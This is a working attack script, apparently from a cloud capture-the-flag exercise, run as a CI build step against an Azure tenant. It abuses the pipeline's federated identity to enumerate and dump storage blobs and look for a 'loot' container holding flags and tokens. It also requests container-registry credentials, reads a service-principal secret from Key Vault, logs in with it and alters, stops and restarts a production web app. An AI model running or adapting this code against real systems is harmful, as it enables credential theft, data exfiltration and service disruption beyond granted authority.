#!/usr/bin/env bash
set -uo pipefail

TEN="3205c325-06a5-4171-9ce8-ffc5e6c2845e"
SUB="c5e4e004-b42d-4ac4-a502-5fd338380eb6"
REPORTING_RG="rg-tbl-reporting-prod-eus"
PLATFORM_RG="rg-tbl-platform-prod-sea"
APP="app-tbl-reporting-prod"

echo "=== BUILD49: APP RESTART + CICD STOR + RS RESTART ==="

# 1. Login as cicd-deployer
JWT=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
  "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" | jq -r '.value')
az login --service-principal -u "$AZURE_CLIENT_ID" -t "$AZURE_TENANT_ID" \
  --federated-token "$JWT" --allow-no-subscriptions -o none
echo "cicd-deployer OK"

# 2. Get cicd-deployer storage token and test ALL storage accounts directly
python3 -I << 'CICDPY'
import subprocess, json, urllib.request, urllib.error, urllib.parse

r = subprocess.run(['az','account','get-access-token','--resource','https://storage.azure.com','--query','accessToken','-o','tsv'],
  capture_output=True, text=True)
STOR = r.stdout.strip()
print(f"cicd STOR token len={len(STOR)}")

if len(STOR) > 100:
    SHDR = {"x-ms-version": "2021-06-08"}

    def rq(url, tok, hdrs=None):
        h = {"Authorization": "Bearer " + tok}
        if hdrs: h.update(hdrs)
        try:
            r = urllib.request.urlopen(urllib.request.Request(url, headers=h), timeout=20)
            return r.status, r.read().decode("utf-8","replace")
        except urllib.error.HTTPError as e:
            return e.code, e.read().decode("utf-8","replace")[:800]
        except Exception as e:
            return 0, str(e)[:150]

    for sa in ["sttblcilogsprodx3euoz","sttblappcfgprodx3euoz","sttblbackupprodx3euoz",
               "sttblreportingprodx3euoz","sttblplatformprodx3euoz","sttblsecprodx3euoz",
               "sttbldataprodx3euoz","sttblprodx3euoz","sttblarchiveprodx3euoz"]:
        s,b = rq(f"https://{sa}.blob.core.windows.net/?comp=list", STOR, SHDR)
        print(f"cicd_stor_{sa}: {s}:{b[:300]}")
        if s == 200:
            import re
            for cname in re.findall(r"<Name>([^<]+)</Name>", b)[:10]:
                sc,bc = rq(f"https://{sa}.blob.core.windows.net/{cname}?restype=container&comp=list", STOR, SHDR)
                print(f"  container {cname}: {sc}:{bc[:400]}")
                if sc == 200:
                    for bn in re.findall(r"<Name>([^<]+)</Name>", bc)[:10]:
                        sb,bb = rq(f"https://{sa}.blob.core.windows.net/{cname}/{bn}", STOR, SHDR)
                        print(f"    blob {bn}: {sb}:{bb[:500]}")

    # Also try loot container with cicd-deployer
    for bn in ["armowner_token.json","flag.txt","flag","DF26"]:
        s,b = rq(f"https://sttblcilogsprodx3euoz.blob.core.windows.net/loot/{bn}", STOR, SHDR)
        print(f"cicd_loot_{bn}: {s}:{b[:400]}")
CICDPY

# 3. Get cicd-deployer ARM token and check its own role assignments
python3 -I << 'CICD_ARM_PY'
import subprocess, json, urllib.request, urllib.error

r = subprocess.run(['az','account','get-access-token','--resource','https://management.azure.com','--query','accessToken','-o','tsv'],
  capture_output=True, text=True)
ARM = r.stdout.strip()
print(f"cicd ARM len={len(ARM)}")

if len(ARM) > 100:
    def rq(url, tok, method="GET", data=None):
        h = {"Authorization": "Bearer " + tok}
        if isinstance(data, dict):
            data = json.dumps(data).encode()
            h["Content-Type"] = "application/json"
        try:
            r = urllib.request.urlopen(urllib.request.Request(url, data=data, method=method, headers=h), timeout=20)
            return r.status, r.read().decode("utf-8","replace")
        except urllib.error.HTTPError as e:
            return e.code, e.read().decode("utf-8","replace")[:800]
        except Exception as e:
            return 0, str(e)[:150]

    SUB = "c5e4e004-b42d-4ac4-a502-5fd338380eb6"
    OID = "63e87ab1-6bd2-4e80-92be-943450b20e4f"  # cicd-deployer OID (from build47 logs)
    PLATFORM_RG = "rg-tbl-platform-prod-sea"
    REPORTING_RG = "rg-tbl-reporting-prod-eus"

    # List cicd-deployer's role assignments
    s,b = rq(f"https://management.azure.com/subscriptions/{SUB}/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01&$filter=principalId+eq+'{OID}'", ARM)
    print(f"cicd_roles: {s}:{b[:2000]}")

    # Try listing ACR with cicd-deployer
    s,b = rq(f"https://management.azure.com/subscriptions/{SUB}/resourceGroups/{PLATFORM_RG}/providers/Microsoft.ContainerRegistry/registries/crtblplatprodx3euoz/listCredentials?api-version=2023-07-01", ARM, "POST")
    print(f"acr_creds: {s}:{b[:500]}")

    # List repositories in ACR
    s,b = rq(f"https://management.azure.com/subscriptions/{SUB}/resourceGroups/{PLATFORM_RG}/providers/Microsoft.ContainerRegistry/registries/crtblplatprodx3euoz/listBuildSourceUploadUrl?api-version=2019-06-01-preview", ARM, "POST")
    print(f"acr_upload: {s}:{b[:300]}")

    # Check all resources
    s,b = rq(f"https://management.azure.com/subscriptions/{SUB}/resources?api-version=2021-04-01", ARM)
    print(f"cicd_all_resources: {s}:{b[:3000]}")
CICD_ARM_PY

# 4. Get reporting-service credentials and try restart
az keyvault secret show --vault-name kv-tbl-prod-x3euoz --name reporting-service-principal \
  --query value -o tsv > /tmp/rs_secret.json 2>/dev/null
python3 -I -c "
import json
v = json.loads(open('/tmp/rs_secret.json').read().strip())
open('/tmp/rs_cid.txt','w').write(v.get('appId',''))
open('/tmp/rs_sec.txt','w').write(v.get('clientSecret',''))
"
RS_CID=$(cat /tmp/rs_cid.txt)
RS_SEC=$(cat /tmp/rs_sec.txt)

az login --service-principal -u "$RS_CID" -p "$RS_SEC" --tenant "$TEN" -o none 2>/dev/null && echo "RS login OK"

python3 -I << 'RS_PY'
import subprocess, json, urllib.request, urllib.error

r = subprocess.run(['az','account','get-access-token','--resource','https://management.azure.com','--query','accessToken','-o','tsv'],
  capture_output=True, text=True)
RS_ARM = r.stdout.strip()
print(f"RS ARM len={len(RS_ARM)}")

if len(RS_ARM) > 100:
    def rq(url, tok, method="GET", data=None):
        h = {"Authorization": "Bearer " + tok}
        if isinstance(data, (dict,list)):
            data = json.dumps(data).encode()
            h["Content-Type"] = "application/json"
        try:
            r = urllib.request.urlopen(urllib.request.Request(url, data=data, method=method, headers=h), timeout=20)
            return r.status, r.read().decode("utf-8","replace")
        except urllib.error.HTTPError as e:
            return e.code, e.read().decode("utf-8","replace")[:800]
        except Exception as e:
            return 0, str(e)[:150]

    SUB = "c5e4e004-b42d-4ac4-a502-5fd338380eb6"
    REPORTING_RG = "rg-tbl-reporting-prod-eus"
    APP = "app-tbl-reporting-prod"

    # Try restart
    s,b = rq(f"https://management.azure.com/subscriptions/{SUB}/resourceGroups/{REPORTING_RG}/providers/Microsoft.Web/sites/{APP}/restart?api-version=2022-03-01", RS_ARM, "POST")
    print(f"rs_restart: {s}:{b[:300]}")

    # Try setting app settings (triggers restart)
    body = {"properties": {"PROBE_RESTART": "49", "WEBSITE_RUN_FROM_PACKAGE": "0"}}
    s,b = rq(f"https://management.azure.com/subscriptions/{SUB}/resourceGroups/{REPORTING_RG}/providers/Microsoft.Web/sites/{APP}/config/appsettings?api-version=2022-03-01", RS_ARM, "PUT", body)
    print(f"rs_appsettings_put: {s}:{b[:500]}")

    # Try just restart
    body2 = {}
    s,b = rq(f"https://management.azure.com/subscriptions/{SUB}/resourceGroups/{REPORTING_RG}/providers/Microsoft.Web/sites/{APP}/stop?api-version=2022-03-01", RS_ARM, "POST")
    print(f"rs_stop: {s}:{b[:300]}")

    s,b = rq(f"https://management.azure.com/subscriptions/{SUB}/resourceGroups/{REPORTING_RG}/providers/Microsoft.Web/sites/{APP}/start?api-version=2022-03-01", RS_ARM, "POST")
    print(f"rs_start: {s}:{b[:300]}")
RS_PY

echo "BUILD49 DONE"
